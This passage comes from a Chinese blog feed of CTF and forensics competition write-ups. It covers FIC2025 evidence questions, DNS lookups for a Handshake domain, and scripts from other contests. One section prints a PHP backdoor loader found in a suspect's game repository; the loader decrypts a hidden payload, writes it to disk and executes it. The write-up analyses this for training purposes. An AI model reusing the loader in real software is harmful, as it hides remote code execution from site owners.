2025/4/15 16:21:41</strong></p><p><strong>B. 2025/4/14 11:48:47</strong></p><p><strong>C. 2025/4/14 11:49:47</strong></p><p><strong>D. 2025/4/14 11:46:47</strong></p><p>可以看出应该是2025/4/14 11:49:47</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745853935266-6afa0bb3-c343-4e4e-bd30-159be14599fe.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="section-14">2</h3><p><strong>请分析检材三，请分析"电脑"检材，并回答，嫌疑人的备用机号码是多少？</strong>备用机号可以在便签里面找到，一段白色的文字</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745855742316-36fd9370-fdbc-401d-99f4-4dbd462701f1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>18877332134</p><h3 id="section-15">3</h3><p><strong>请分析检材三，请分析"电脑"检材，并回答，域名dgy02.com曾保存过一个密码，该密码是多少？</strong></p><p>用之前得到的google密钥环进入google浏览器，查看密钥管理即可得到保存的密码</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745856082440-fffa2774-438b-4a02-90d9-0a021002f039.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>tcgg123456</p><h3 id="section-16">4</h3><p><strong>请分析检材三，请分析"电脑"检材，并回答，其电脑安装的微信版本是多少？</strong></p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745856561213-32ad8303-fd03-4a52-8645-1c4a840105d8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>4.0.0.21</p><h3 id="section-17">5</h3><p><strong>请分析检材三，请分析"电脑"检材，并回答，该系统有哪些远程控制软件</strong></p><p><strong>A. todesk</strong></p><p><strong>B. 向日葵</strong></p><p><strong>C. raylink</strong></p><p><strong>D. 爱思远控</strong></p><p>可以看到是todesk和向日葵</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745856678065-5a7ff31b-72c4-4357-894b-86ec8509491c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>AB</p><h3 id="section-18">6</h3><p><strong>请分析检材三，请分析"电脑"检材，并回答，电脑2025年4月10日11点4分29秒曾被向日葵远程控制，其记录的日志文件名为</strong></p><p>先搜索到sunlogin的日志，然后根据时间段锁定日志文件</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745856866404-8645c7fd-747f-46cc-9165-c19b90515241.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>sunlogin_service.log.2</p><h3 id="section-19">7</h3><p><strong>请分析检材三，请分析"电脑"检材，并回答，电脑2025年4月10日11点4分29秒曾被向日葵远程控制，日志内记录对方公网IP地址和端口为</strong></p><p>查看日志可以看到ip和端口</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745857122314-6f11ea67-a2e4-44b9-996b-7ec556ab21b1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>116.192.161.222:2577</p><h3 id="section-20">8</h3><p><strong>请分析检材三，请分析"电脑"检材，并回答，某文件的MD5值为“2bdfcdbd6c63efc094ac154a28968b7d”，该文件名为</strong></p><p>在<code>/home/adm1n/图片</code>下找到一个文件</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745857405265-9242a86c-4514-4815-bc29-155fcbca39d3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>important.docx</p><h3 id="section-21">9</h3><p><strong>请分析检材三，请分析"电脑"检材，据调查，上述文件存放了钱包助记词，第一个单词是什么？</strong></p><p>将docx后缀改为zip后解压，发现一个important.xml，看起来实际上是个jpg</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745857645412-be31b6dc-5672-4f92-ade1-5634a3d1e320.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>后缀名改为jpg即可看到助记词</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745857681915-8eab8cea-3f93-4bfe-bb65-037cf56b2802.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>solution</p><h3 id="section-22">10</h3><p><strong>请分析检材三（“我的测试机”），最近曾访问过的音频文件，该音频文件的文件名是什么</strong></p><p>在<code>/home/adm1n/文档</code>下找到我的测试机</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745857834641-325fc450-8ad7-4975-aea3-638a8e54b70f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在这个vmdk中找到音频文件</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745858118986-f8dda44a-e4c3-4100-8482-1831b4b0f600.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>自传小说.MP3</p><h3 id="section-23">11</h3><p><strong>请分析检材三（“我的测试机”），最近曾使用过USB设备，该设备的名称为</strong></p><p><strong>A. ThinkPLus</strong></p><p><strong>B. Toshiba</strong></p><p><strong>C. Samsumg</strong></p><p><strong>D. Database</strong></p><p>查看usb使用痕迹,可以看出是thinkplus</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745858210234-58d82230-c136-4f61-8277-db4a5cc8f6b3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>A</p><h3 id="section-24">12</h3><p><strong>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人现任妻子毕业的大学是？</strong>下面几题都是硬听音频就行(</p><p>北京大学</p><h3 id="section-25">13</h3><p><strong>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人是通过一个朋友认识的陈老板，该朋友姓氏拼音是？</strong></p><p>wang</p><h3 id="section-26">14</h3><p><strong>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人所说的香格里拉大酒店实则是？</strong></p><p>棋牌室</p><h3 id="section-27">15</h3><p><strong>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人银行密码是多少？</strong></p><blockquote><p>这题就非常的抽象了，可以发现音频中的内容是一段一段的，取每一段的第一个字，拼起来就是银行卡密码。。。</p></blockquote><p>取每一段的第一个字，得<code>我的银行密码是07145924</code></p><p>07145924</p><h2 id="互联网取证">互联网取证</h2><h3 id="section-28">1</h3><p><strong>请分析检材二，找到李某上游人员陈某博客宣传所用域名为</strong></p><p>之前的聊天记录里有提到过</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745859693111-0bca12da-523d-4c6e-b2a8-b9809aa26e73.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>chen.foren6</p><h3 id="section-29">2</h3><p><strong>请分析陈某宣传所用域名，该域名的顶级域名在以下那个区块链注册</strong></p><p><strong>A. ETH（https://ens.domains/）</strong></p><p><strong>B. HNS（https://handshake.org/）</strong></p><p><strong>C. BTC（https://bitcoin.org/）</strong></p><p><strong>D. Namecoin（https://www.namecoin.org/）</strong></p><p>直接去google上查.foren6，就能查到namebase上有相关信息</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745859880267-ba9f58a8-538a-4632-9eb0-3b5f48c7ca12.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>B</p><h3 id="section-30">3</h3><p><strong>请分析陈某宣传所用域名的顶级域名的域名解析服务器（DNS）共有几个</strong></p><p>由上题</p><p>2</p><h3 id="section-31">4</h3><p><strong>请分析陈某宣传所用域名的顶级域名的NS1服务器ip为</strong></p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745860950498-d42a7aa2-4525-40a6-9281-a3ed2043cedd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>45.79.133.98</p><h3 id="section-32">5</h3><p><strong>请分析陈某宣传所用域名，该域名DNS记录指向邮件服务器域名为</strong></p><p>从这里开始配置了<ahref="https://docs.hnsdns.com/dns-resolver/">hnsdns</a></p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745861239006-8bccfc97-2384-477f-8402-19c986804d61.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>mail.163.com</p><h3 id="section-33">6</h3><p><strong>请分析陈某宣传所用域名，该域名的txt记录中chen的值为</strong></p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745861435690-7c6df6a3-8b6a-4035-a59e-46d2ed69aa1e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>fengbaoliejiu</p><h3 id="section-34">7</h3><p><strong>请分析陈某宣传所用域名，该域名DNS记录没有以下那个域名</strong></p><p><strong>A. admin.chen.foren6</strong></p><p><strong>B. caidan.chen.foren6</strong></p><p><strong>C. fichen.foren6</strong></p><p><strong>D. hl.chen.foren6</strong></p><p>对三个域名dig一下看状态即可。但是据说赛后环境发生了改变，比赛的时候应该是选D。</p><p>从我现在复现来看，应该是选B。</p><p>反正大致方法如此。</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745861849457-af50a77e-ec66-4188-9fda-00e680720dfd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745861864120-b922adc0-da2f-496d-8b61-33b3b1898df8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="section-35">8</h3><p><strong>请分析陈某宣传所用域名，该博客域名最终DNS解析指向的github仓库名为</strong></p><p>这里其实可以直接在github上搜，反正我比赛时是这么做的()</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745862108188-13ddd158-319f-438a-ac58-eac90606680c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>chewhaoN.github.io</p><h3 id="section-36">9</h3><p><strong>请分析陈某github账号，陈某对jkroepke/2Moons项目增改了几个文件</strong><imgsrc="/images/FIC2025初赛-writeup-复现/1745863192825-795e84b1-12e8-4fa2-8f34-d299c7f26976.png"alt="img" /></p><p>2</p><h3 id="section-37">10</h3><p><strong>请分析陈某github账号，陈某在修改2Moons过程中提到了什么锅底</strong></p><p>查看修改过的地方</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745863323520-6407d9f3-4d73-4f96-abbc-7b3db52b0e3c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745863364403-caf2382b-f5ab-4757-bdc3-603d2d611e03.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>蜂蜜锅底</p><h3 id="section-38">11</h3><p><strong>请分析陈某github账号，陈某在游戏2Moons中放置的后门连接码的密码为</strong></p><p>根据前面找到的后门，将css文件下载下来计算一下md5值，encrypted.binbase64编码一下，然后解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b = hex2bin(<span class="string">&quot;16ca13d6d1694226be748bb9be927a38&quot;</span>);</span><br><span class="line">$c = <span class="string">&quot;9T8NBGdXI1Xe46fDOsPmrmuhAD9Rk/XQMRukLHJDXMm9wexBjKY/8QQv1OvxCiA87B0ZQ9kFgQiJ0fCquio0EcK5sWr1yUMYrapSWgUXMbD2/P4Qs9lO1cc53rRgZ8lg5r7d21YJkFFkyKJDMAmEjw==&quot;</span>;</span><br><span class="line">$d = base64_decode($c);</span><br><span class="line">$e = <span class="string">&#x27;aes-256-cbc&#x27;</span>;</span><br><span class="line">$f = openssl_cipher_iv_length($e);</span><br><span class="line">$g = substr($d, <span class="number">0</span>, $f);</span><br><span class="line">$h = substr($d, $f);</span><br><span class="line">$i = openssl_decrypt($h, $e, $b, OPENSSL_RAW_DATA, $g);</span><br><span class="line">$k = <span class="string">&#x27;./func_&#x27;</span> . uniqid() . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">file_put_contents($k, $i);</span><br><span class="line">include $k;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745918877052-28272a54-7cf3-4c3b-878f-38ea265d2c3e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ficnb</p><h3 id="section-39">12</h3><p><strong>请访问陈某当前博客，陈某课程的扫码报名地址的域名为</strong></p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745864111424-72f75efb-2ee4-4fd8-956c-e12ad9712ed3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>fic.forensix.cn</p><h3 id="section-40">13</h3><p><strong>请分析陈某当前博客，通过互联网找到陈某的旧博客网站标题为</strong></p><p>点老博客得到老博客地址http://forensix2025.work.gd/</p><p>在web.archive.org上可以查到过去的网页快照</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745864451149-00b25e4b-172e-4266-8d90-bb82a19adbf0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>柳如烟大战霸天虎</p><h3 id="section-41">14</h3><p><strong>请分析陈某旧博客，陈某的姓名为</strong></p><p>在前面的题中就可以知道</p><p>陈浩北</p><h3 id="section-42">15</h3><p><strong>请分析陈某旧博客，陈某的邮箱地址为</strong></p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745864552401-70ed7075-8cf7-4e41-8224-15f140ead1ed.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>mailme@chen.foren6</p><h3 id="section-43">16</h3><p><strong>请分析陈某旧博客，陈某的11位手机号为</strong></p><p>从前面的题中可以知道</p><p>13170010703</p><h3 id="section-44">17</h3><p><strong>请分析陈某旧博客，陈某最爱的dota英雄为</strong></p><p>查一下文章的标题就知道了</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745864862174-486178d5-8a18-405a-b46c-5b71c94397f1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>邪影芳灵</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> FIC </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2025 Writeup</title>
      <link href="/posts/29fccdc3/"/>
      <url>/posts/29fccdc3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>校队刚刚招新结束，这次跟校队打看看新校队实力。</p><p>本菜狗做了点misc，也算是有贡献了，虽说这次大多misc都挺简单的()</p></blockquote><p><ahref="https://www.blog.st4rr.top/writeups/ACTF2025Writeup.pdf">Writeup点我</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> ACTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字中国2025 数字产业安全积分争夺赛决赛 Writeup</title>
      <link href="/posts/c07c3c6c/"/>
      <url>/posts/c07c3c6c/</url>
      
        <content type="html"><![CDATA[<p>不会ai，被爆杀了。</p><p>幸好在这个线下断网的比赛中，脚本编写能力尚且在线，还是做了两题的，也算有所贡献了()</p><p>当然开心的还是成功面基到了很多星盟的师傅们:)</p><h3 id="数据识别与审计题目1">数据识别与审计题目1</h3><p>从流量包中导出所有的phpsessid和查询的value</p><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛决赛-Writeup/1745409137642-c7cd4479-19e6-441a-af8b-ae6726795da2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用脚本处理数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">ff=<span class="built_in">open</span>(<span class="string">&#x27;2.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">searching=f.readline()</span><br><span class="line">phpid=ff.readline()</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3000</span>):</span><br><span class="line">    searching=f.readline().strip()</span><br><span class="line">    phpid=ff.readline().strip()[<span class="number">10</span>:]</span><br><span class="line">    <span class="built_in">print</span>(searching,phpid)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;session_<span class="subst">&#123;phpid&#125;</span>&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fff:</span><br><span class="line">            js=fff.readline().strip()</span><br><span class="line">            pattern = <span class="string">r&#x27;i:\s*(.*?)\s*;&#x27;</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern,js)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                who=<span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(who)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;wtf&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> js[-<span class="number">3</span>]!=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> who!=searching:</span><br><span class="line">                s+=<span class="string">&#x27;_&#x27;</span>+who</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Not found&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛决赛-Writeup/1745409191978-c60616ac-0b31-4fa0-a23c-433204911813.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="数据识别与审计题目3">数据识别与审计题目3</h3><p>先从网站上爬取所有url，然后用脚本判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&#x27;http://192.168.56.133&#x27;</span></span><br><span class="line">urls=[]</span><br><span class="line">disallows=[<span class="string">&#x27;/logs&#x27;</span>,<span class="string">&#x27;/user/profile&#x27;</span>,<span class="string">&#x27;/api&#x27;</span>,<span class="string">&#x27;/admin&#x27;</span>,<span class="string">&#x27;/private/folder&#x27;</span>,<span class="string">&#x27;/debug&#x27;</span>,<span class="string">&#x27;/details&#x27;</span>,<span class="string">&#x27;.bak&#x27;</span>,<span class="string">&#x27;?token=&#x27;</span>]</span><br><span class="line">allows=[<span class="string">&#x27;/logs/public&#x27;</span>,<span class="string">&#x27;/api/v2/safe&#x27;</span>,<span class="string">&#x27;.zip&#x27;</span>,<span class="string">&#x27;/download&#x27;</span>,<span class="string">&#x27;/about&#x27;</span>,<span class="string">&#x27;/services&#x27;</span>,<span class="string">&#x27;/title&#x27;</span>,<span class="string">&#x27;/products&#x27;</span>,<span class="string">&#x27;/register&#x27;</span>,<span class="string">&#x27;/temp&#x27;</span>,<span class="string">&#x27;/system&#x27;</span>,<span class="string">&#x27;search?q=&#x27;</span>,<span class="string">&#x27;/restricted&#x27;</span>,<span class="string">&#x27;/cart&#x27;</span>]</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">31</span>):</span><br><span class="line">    urll=url+<span class="string">f&#x27;?page=<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    r=requests.get(url=urll).text</span><br><span class="line">    pattern=<span class="string">r&#x27;&lt;a href=&quot;(.*?)&quot;&#x27;</span></span><br><span class="line">    <span class="keyword">match</span>=re.findall(pattern,r)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        urls+=<span class="keyword">match</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> disallows:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> i:</span><br><span class="line">            cnt+=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> allows:</span><br><span class="line">                <span class="keyword">if</span> x <span class="keyword">in</span> i:</span><br><span class="line">                    cnt-=<span class="number">1</span></span><br><span class="line">                    <span class="built_in">print</span>(-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(urls))</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/数字中国2025-数字产业安全积分争夺赛决赛-Writeup/1745409277464-55815b4b-30fd-4867-aea1-1429764bf920.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 数字中国 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>能源安全大赛2025 复现</title>
      <link href="/posts/3012c0e4/"/>
      <url>/posts/3012c0e4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次是跟联队最顶尖的佬们组的队，对我来说完全高端局。师傅们很厉害，给队伍干到了第四名Orz，但是我又爆零了。。。</p><p>赛后看了其他队伍的wp，misc的黑白相间这题我没做出来真的纯纯千古罪人了OrzOrzOrz</p><p>多说无益，开始复现（能看懂的题都复现一下好了）</p></blockquote><h2 id="misc">Misc</h2><h3 id="黑白相间">黑白相间</h3><p>发现在图片的末尾还有一张倒着的图片，提取出来</p><figure><img src="/images/能源安全大赛2025-复现/image-20250418193757284.png"alt="image-20250418193757284" /><figcaption aria-hidden="true">image-20250418193757284</figcaption></figure><p>分别读取1.png和2.png，读到黑色像素记为1，白色像素记为0，将两张图片逐个像素异或得到一个二进制字符串，frombin以后发现是个zip文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image_to_binary</span>(<span class="params">image_path</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    width, height = img.size</span><br><span class="line">    binary_data = []</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            pixel = img.getpixel((x, y))</span><br><span class="line">            binary_data.append(<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> pixel == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(binary_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1_path, image2_path</span>):</span><br><span class="line">    binary1 = image_to_binary(image1_path)</span><br><span class="line">    binary2 = image_to_binary(image2_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary1) != <span class="built_in">len</span>(binary2):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;两张图片的尺寸不一致，无法逐像素异或&quot;</span>)</span><br><span class="line">    xor_result = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> b1 != b2 <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> b1, b2 <span class="keyword">in</span> <span class="built_in">zip</span>(binary1, binary2)])</span><br><span class="line">    <span class="keyword">return</span> xor_result</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    image1_path = <span class="string">&quot;1.png&quot;</span></span><br><span class="line">    image2_path = <span class="string">&quot;2.png&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xor_result = xor_images(image1_path, image2_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;异或结果的二进制字符串：&quot;</span>, xor_result)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发生错误：&quot;</span>, e)</span><br></pre></td></tr></table></figure><figure><img src="/images/能源安全大赛2025-复现/image-20250418194818614.png"alt="image-20250418194818614" /><figcaption aria-hidden="true">image-20250418194818614</figcaption></figure><blockquote><p>但是卡在这了，解压出来的flag看了半天不知道是什么东西，结果是个去掉了头的bmp文件。。。</p><p>作为一个misc手，对bmp文件的十六进制格式还如此生疏，在此做出深刻检讨。</p></blockquote><p>flag是一个去掉了头的bmp文件，在开头补上424d即可</p><figure><imgsrc="/images/能源安全大赛2025-复现/image-20250418195500568-1745408801832.png"alt="image-20250418195500568" /><figcaption aria-hidden="true">image-20250418195500568</figcaption></figure><p>是一个汉信码，但是可以看出左下角的定位点被旋转过了，转回去</p><figure><img src="/images/能源安全大赛2025-复现/image-20250418201538967.png"alt="image-20250418201538967" /><figcaption aria-hidden="true">image-20250418201538967</figcaption></figure><figure><img src="/images/能源安全大赛2025-复现/image-20250418201552400.png"alt="image-20250418201552400" /><figcaption aria-hidden="true">image-20250418201552400</figcaption></figure><h3 id="knn">knn</h3><p>大体思路就是从检测数据的csv表格中读取A车和B车的数据，根据题目名称可知用knn算法训练模型，然后对待检测数据表格中的每一行数据进行识别判断出是A车还是B车，A车记为1，B车记为0，frombin得到flag</p><p>不清楚n_neighbors是多少，写个脚本爆破一下找找合乎格式的flag即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;1.csv&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">X = data[[<span class="string">&#x27;防碰撞评分&#x27;</span>, <span class="string">&#x27;电池容量评分&#x27;</span>, <span class="string">&#x27;智能驾驶能力&#x27;</span>, <span class="string">&#x27;智能座舱评分&#x27;</span>]]</span><br><span class="line">y = data[<span class="string">&#x27;名称&#x27;</span>].<span class="built_in">map</span>(&#123;<span class="string">&#x27;A车&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;B车&#x27;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">scaler = StandardScaler()</span><br><span class="line">X_scaled = scaler.fit_transform(X)</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X_scaled, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 